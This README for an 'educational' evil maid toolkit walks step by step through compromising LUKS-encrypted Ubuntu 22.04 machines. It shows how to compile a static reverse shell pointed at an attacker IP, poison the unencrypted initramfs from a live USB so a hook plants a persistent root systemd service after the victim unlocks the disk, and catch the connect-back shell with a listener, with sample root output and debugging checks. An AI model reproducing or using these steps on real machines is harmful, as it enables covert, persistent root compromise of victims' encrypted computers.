# evil-maid-segops

Educational evil maid attack toolkit targeting Ubuntu 22.04 with LUKS full-disk encryption.  
**For lab/CTF use only. Requires physical access to the target machine.**

---

## How it works

LUKS encrypts everything except `/boot`. The attack plants a hook inside the unencrypted initramfs. On next boot the victim types their passphrase as usual — LUKS unlocks, and the hook fires silently inside the initramfs before the OS takes over. It copies the reverse shell binary onto the real root filesystem and registers it as a persistent systemd service.

```
[Attacker]                          [Victim machine]
    |                                       |
    |-- 1. Compile em_shell (CI) ---------> |
    |-- 2. Boot victim with live USB        |
    |-- 3. Run poison_boot.sh              |
    |       └─ mounts /boot                |
    |       └─ injects hook into initramfs |
    |       └─ repacks + replaces initrd   |
    |-- 4. Reboot victim (remove USB)      |
    |                                [victim enters LUKS passphrase]
    |                                [initramfs hook fires]
    |                                [em_shell installed + service started]
    |-- 5. Run em_listener.py <----------  em_shell connects back
    |       └─ interactive shell           |
```

---

## Files

| File | Purpose |
|------|---------|
| `em_shell.cpp` | Reverse shell payload source (C++) |
| `em_inject_hook` | Hook injected into victim's initramfs — runs after LUKS unlock |
| `poison_boot.sh` | Attacker script — modifies victim's initramfs from live USB |
| `inject_evil_maid.sh` | Variant for unencrypted disks (no initramfs needed) |
| `em_listener.py` | Attacker-side listener — receives the reverse shell |
| `.github/workflows/build.yml` | CI — compiles `em_shell` as a static Linux binary |

---

## Step 1 — Compile the payload

Trigger the **Build em_shell** GitHub Actions workflow manually:

1. Go to **Actions → Build em_shell → Run workflow**
2. Fill in:
   - `attacker_ip` — your listener IP (the machine that will run `em_listener.py`)
   - `attacker_port` — your listener port (default `4444`)
   - `retry_delay` — seconds between reconnect attempts (default `30`)
3. Download the artifact `em_shell-<ip>-<port>` once the job completes

The binary is compiled statically (`-static`) on Ubuntu 22.04 — no shared lib dependencies, works inside the initramfs and on the victim's OS.

To compile locally instead:
```bash
g++ -DATTACKER_IP='"192.168.1.10"' -DATTACKER_PORT=4444 -static -o em_shell em_shell.cpp
```

---

## Step 2 — Prepare the live USB environment

Boot the victim machine from a Linux live USB (Ubuntu, Kali, Parrot, etc.).  
Open a terminal and install the required tools:

```bash
sudo apt update && sudo apt install -y initramfs-tools python3
```

Clone or copy this project onto the live USB (or any writable location):

```bash
git clone <repo-url>
cd evil-maid-segops
# drop the compiled em_shell binary here
```

The working directory must contain:
- `em_shell` (compiled binary from Step 1)
- `em_inject_hook` (already in the repo)

---

## Step 3 — Poison the boot partition

Find the victim's unencrypted `/boot` partition:

```bash
lsblk -f
```

Look for the partition with `FSTYPE=ext4` or `vfat` that is **not** `crypto_LUKS`. Typically `/dev/sda3`.

Run the attack:

```bash
sudo bash poison_boot.sh -b /dev/sda3
```

The script will:
1. Mount `/boot`
2. Back up the original initrd to `/boot/.bak/`
3. Extract the initramfs
4. Inject `em_shell` and `em_inject_hook` into it
5. Repack and replace the initrd
6. Verify the hook is present before committing
7. Unmount

If something goes wrong the original initrd is restored automatically from the backup.

To restore manually at any time:
```bash
sudo mount /dev/sda3 /mnt/boot
sudo cp /mnt/boot/.bak/initrd.img-<version>.bak /mnt/boot/initrd.img-<version>
sudo umount /mnt/boot
```

---

## Step 4 — Reboot and wait

Remove the live USB and let the victim boot normally.  
They enter their LUKS passphrase as usual — nothing looks different to them.

Behind the scenes, inside the initramfs:
1. LUKS unlocks the volume
2. LVM activates
3. Root is mounted at `/root` (still read-only at this point)
4. `em_inject_hook` runs in `local-bottom`:
   - Remounts root read-write
   - Copies `em_shell` to `/usr/local/bin/em_shell`
   - Writes `/etc/systemd/system/em-shell.service`
   - Creates the `multi-user.target.wants` symlink
5. OS boots normally

After this boot `em-shell.service` is enabled and persistent across reboots.

---

## Step 5 — Catch the shell

On your attacker machine, start the listener before the victim boots (or any time — `em_shell` retries every 30 s):

```bash
python3 em_listener.py           # default port 4444
python3 em_listener.py 9001      # custom port
```

Once `em_shell` connects you get an interactive prompt:

```
[*] Listening on 0.0.0.0:4444 ...
[+] Shell from 192.168.1.X:54321
$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root)
$ 
```

Press `Ctrl+C` or `Ctrl+D` to close the session cleanly.

Notes:
- The listener uses `SO_REUSEADDR` — you can restart it immediately without waiting for the socket to time out
- Empty input lines are ignored (won't send a blank newline to the shell)
- Output buffer is 64 KB — enough for most command output; very large output (e.g. `find /`) may be truncated in a single read

---

## Debugging

If the shell never connects, check on the victim after it boots:

```bash
# Did the hook run inside the initramfs?
sudo dmesg | grep em_inject

# Expected output:
# em_inject: start rootmnt=/root
# em_inject: remounted rw
# em_inject: copying binary
# em_inject: binary OK
# em_inject: service file written
# em_inject: done

# Is the service installed and running?
systemctl status em-shell.service

# Is the binary there?
ls -la /usr/local/bin/em_shell
```

---

## Requirements summary

| Where | What |
|-------|------|
| Live USB | `initramfs-tools`, `python3`, `cpio` (usually pre-installed) |
| Attacker machine | Python 3 (any version) |
| Target | Ubuntu 22.04, LUKS full-disk encryption, GRUB with separate `/boot` |
